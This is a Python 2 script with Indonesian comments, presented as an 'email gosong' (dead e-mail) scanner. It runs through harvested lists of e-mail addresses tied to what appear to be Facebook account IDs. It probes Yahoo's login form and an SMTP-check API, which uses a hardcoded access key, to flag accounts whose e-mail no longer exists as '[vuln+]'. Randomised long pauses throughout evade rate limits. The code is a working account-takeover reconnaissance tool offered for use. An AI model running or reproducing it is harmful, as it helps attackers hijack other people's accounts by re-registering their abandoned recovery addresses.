# rawan hang, buka tutup file saja. append.
# import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
import os, sys, time, datetime, random, re, json, urllib2
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
W = "\033[0m"
G = '\033[32;1m'
R = '\033[31;1m'
bgm = '\x1b[41m'
p = '\x1b[0m'

# Reset
Color_Off="\[\033[0m\]"       # Text Reset

# Regular Colors
Black="\[\033[0;30m\]"        # Black
Red="\[\033[0;31m\]"          # Red
Green="\[\033[0;32m\]"        # Green
Yellow="\[\033[0;33m\]"       # Yellow
Blue="\[\033[0;34m\]"         # Blue
Purple="\[\033[0;35m\]"       # Purple
Cyan="\[\033[0;36m\]"         # Cyan
White="\[\033[0;37m\]"        # White

# Bold
BBlack="\[\033[1;30m\]"       # Black
BRed="\[\033[1;31m\]"         # Red
BGreen="\[\033[1;32m\]"       # Green
BYellow="\[\033[1;33m\]"      # Yellow
BBlue="\[\033[1;34m\]"        # Blue
BPurple="\[\033[1;35m\]"      # Purple
BCyan="\[\033[1;36m\]"        # Cyan
BWhite="\[\033[1;37m\]"       # White

# Underline
UBlack="\[\033[4;30m\]"       # Black
URed="\[\033[4;31m\]"         # Red
UGreen="\[\033[4;32m\]"       # Green
UYellow="\[\033[4;33m\]"      # Yellow
UBlue="\[\033[4;34m\]"        # Blue
UPurple="\[\033[4;35m\]"      # Purple
UCyan="\[\033[4;36m\]"        # Cyan
UWhite="\[\033[4;37m\]"       # White

# Background
On_Black="\[\033[40m\]"       # Black
On_Red="\[\033[41m\]"         # Red
On_Green="\[\033[42m\]"       # Green
On_Yellow="\[\033[43m\]"      # Yellow
On_Blue="\[\033[44m\]"        # Blue
On_Purple="\[\033[45m\]"      # Purple
On_Cyan="\[\033[46m\]"        # Cyan
On_White="\[\033[47m\]"       # White

# High Intensty
IBlack="\[\033[0;90m\]"       # Black
IRed="\[\033[0;91m\]"         # Red
IGreen="\[\033[0;92m\]"       # Green
IYellow="\[\033[0;93m\]"      # Yellow
IBlue="\[\033[0;94m\]"        # Blue
IPurple="\[\033[0;95m\]"      # Purple
ICyan="\[\033[0;96m\]"        # Cyan
IWhite="\[\033[0;97m\]"       # White

# Bold High Intensty
BIBlack="\[\033[1;90m\]"      # Black
BIRed="\[\033[1;91m\]"        # Red
BIGreen="\[\033[1;92m\]"      # Green
BIYellow="\[\033[1;93m\]"     # Yellow
BIBlue="\[\033[1;94m\]"       # Blue
BIPurple="\[\033[1;95m\]"     # Purple
BICyan="\[\033[1;96m\]"       # Cyan
BIWhite="\[\033[1;97m\]"      # White

# High Intensty backgrounds
On_IBlack="\[\033[0;100m\]"   # Black
On_IRed="\[\033[0;101m\]"     # Red
On_IGreen="\[\033[0;102m\]"   # Green
On_IYellow="\[\033[0;103m\]"  # Yellow
On_IBlue="\[\033[0;104m\]"    # Blue
On_IPurple="\[\033[10;95m\]"  # Purple
On_ICyan="\[\033[0;106m\]"    # Cyan
On_IWhite="\[\033[0;107m\]"   # White

    
def masuk():
    global toket
    #os.system('reset')

    #print BYellow+'.                  /)-._   .'.center(44)
    #print ".          Leo    Y. ' _]  .".center(44)
    #print '.          ,.._   |`--"=   .'.center(44)
    #print '.         /    "-/   \     .'.center(44)
    #print './)      |   |_     `\|___ .'.center(44)
    #print '.\:::::::\___/_\__\_____,,\.'.center(44)
    
    
    print BYellow+"                                           ______ "
    time.sleep(0.1);
    print "                                ______,---'__,---' "
    time.sleep(0.1);
    print "                            _,-'---_---__,---' "
    time.sleep(0.1);
    print "                     /_    (,  ---____', "
    time.sleep(0.1);
    print "                    /  ',,   ', ,-' "
    time.sleep(0.1);
    print "                   ;/)   ,',,_/,' "
    time.sleep(0.1);
    print "                   | /\   ,.'//\ "
    time.sleep(0.1);
    print "                   '-' \ ,,'    '. "
    time.sleep(0.1);
    print "                        '',   ,-- '. "
    time.sleep(0.1);
    print "                        '/ / |      ',         _ "
    time.sleep(0.1);
    print "                        //'',.\_    .\\      ,{==>- "
    time.sleep(0.1);
    print "                     __//   __;_'-  \ ';.__,;' "
    time.sleep(0.1);
    print "                   ((,--,) (((,------;  '--' "
    time.sleep(0.1);
    print "                   '''  '   ''' "
    time.sleep(0.1);    
    
    print Color_Off+ ' '
    print ('Mpu YONO').center(44)
    print (W + '     [' + G +'ALAT SCANNER EMAIL GOSONG DOREMON'+ W + ']'+ G)
    print (W + '  pastikan ada koleksi files: /output/allm_*.txt'+ G)
    print ' '
    
    #------------------------------
    noa = 1
    plh = ''
    kun = []
    berhasil = []
    
    try:
      os.mkdir('output')
    except OSError:
      pass

    #LOOP, cari semua file *.bj (cookies) dalam dir....print all.
    for i in os.listdir(sys.path[0]+'/output'):
        #klo file i = "*.bj"
        if "allm_" in i :
            # [1] 100003078072846.
            # [2] 100001014566278.
            print '  [' + str(noa) + '] ' + i[:-3]
            #append, masukkan nama file, dalam array list
            kun.append(i)
            #incr counter
            noa += 1
    
    #print 'file root ' + str(kun) +' - ' + sys.path[0]
    #klo array tdk kosong
    if kun != []:
      #print 'file ada'
      #input nomer =plh
      plh = input('\n[*]pilih akun no.brapa?(enter=exit): '+W)
      if plh == '' :
        sys.exit()
      
      #init
      timz=0
      timzz=0
      rdm1=random.randrange(10, 15)
      rdm2=random.randrange(10, 15)
      lockz=0
      target='z@@2'

      #aquire "target" ,file output plh adakah?
      if os.path.exists('output/Vuln%s' % str(kun[plh-1][4:])):
         fileo = 'output/Vuln'+kun[plh-1][4:]
         print '~/v/'+fileo
         with open(fileo, 'r') as filex:
           linex = filex.readlines()
           #print linex
           for i in range(len(linex)-1):
            #print i
            #print linex[len(linex)-1-i]
            #kloter cek terakhir
            if i == len(linex)-2:
              #exit for, target='z@@2'. lockz=0 tetap. mulai dari awal
              break            
            try:
              testz = linex[len(linex)-1-i].split(',')[2].strip()
              #print 'dapat:>>'+testz+'<<'
              #print len(linex)-i+1
              
              if testz.isdigit():
                target = testz
                print G+"tadi sampai "+ R +target+".."+G+" Ok,Lanjot.."+W
                lockz=1
                break
            except:
              continue
      #else:
         #file output tidak ada. lockz=0 tetap. target='z@@2'
         #pass
      #print ' sukses....'+target
      #sys.exit()

      linex=''
      try:
        close.filex()
      except:
        pass

      #create or open file to append
      save = open('output/Vuln'+kun[plh-1][4:], 'a+')
      save.write('[LANJUTAN+]========================\n')
      save.close()

      #open for read only
      with open('output/'+kun[plh - 1]) as fp:
       for cnt, line in enumerate(fp):
        try:
         if target in line.split(',')[1] and lockz==1 :
           lockz=0
         #search by number-id, of file input
         #print("Line {}: {}".format(cnt, line))
         if "yahoo.com" in line.split(',')[0] and lockz==0 :
          if timz == rdm1 : 
            timz = 0
            rdm1=random.randrange(10, 15)
            rdmz1=random.randrange(65, 130)
            print '[+]satpam lewat.. sec:'+str(rdmz1)
            start = time.time()
            time.sleep(rdmz1)
            print("elapsed %.2fsec" % (time.time() - start))
          timz=timz+1

          try:
            try:
              mail = line.split(',')[0].strip()
            except:
              mail = line.strip()
            yahoo = re.compile('@.*')
            print 'coba: '+mail
            try:
              br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            except urllib2.URLError as e:
              print "URLError................."
              continue

            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            try:
              klik = br.submit().read()
              jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            except urllib2.URLError as e:
              print "URL Error................."
              continue

            try:
                pek = jok.search(klik).group()
            except:
                #print 'feedback error..'
                print 'nop..'
                continue
            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save = open('output/Vuln'+kun[plh-1][4:], 'a+')
                save.write('[vuln+],' +line.strip() + '\n')
                save.write('*******************\n')
                save.close()
                print G+bgm + '[vuln+]' + p + line
                berhasil.append('[vuln+],' +line.strip())
            else:
                print 'tidak bisa..'
          except KeyError:
            pass

         if "hotmail.com" in line.split(',')[0] and lockz==0 :
          if timzz == rdm2 : 
            timzz = 0
            rdm2=random.randrange(10, 15)
            rdmz2=random.randrange(125, 300)
            print '[+]satpam lewat.. sec:'+str(rdmz2)
            start = time.time()
            time.sleep(rdmz2)
            print("elapsed %.2fsec" % (time.time() - start))
          timzz=timzz+1

          print line.split(',')[0].strip()
          try:
            try:
              mail = line.split(',')[0].strip()
            except:
              mail = line.strip()
            print 'coba: '+mail
            try:
              url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + mail + "&smtp=1&format=1")
              cek = json.loads(requests.get(url).text)
            except urllib2.URLError as e:
              print "URLError................."
              continue

            if cek['smtp_check'] == 0:
              save = open('output/Vuln'+kun[plh-1][4:], 'a+')
              save.write('[vuln+],' +line.strip() + '\n')
              save.write('-------------------\n')
              save.close()
              print G+bgm + '[vuln+]' + p + line
              berhasil.append('[vuln+],' +line.strip())
            else:
              print 'tidak bisa..'
          except KeyError:
            pass
        except:
         continue

      print ' \n'
      print G+bgm + '------------------------------------\n'+Color_Off
      #print p+G+'Summary:\n'+Color_Off
      #print "\n".join(berhasil)
      #print ' \n'
      print Yellow+'\[+]Done.\n'
      print '\[+]Total: ' + str(len(berhasil))+'\n'
      print '\[+]File saved: ~/v/output/Vuln'+kun[plh - 1][4:]+'\n'
      print G+bgm + '------------------------------------\n'+Color_Off
      berhasil=[]
      #save.close()

if __name__ == '__main__':
    masuk()

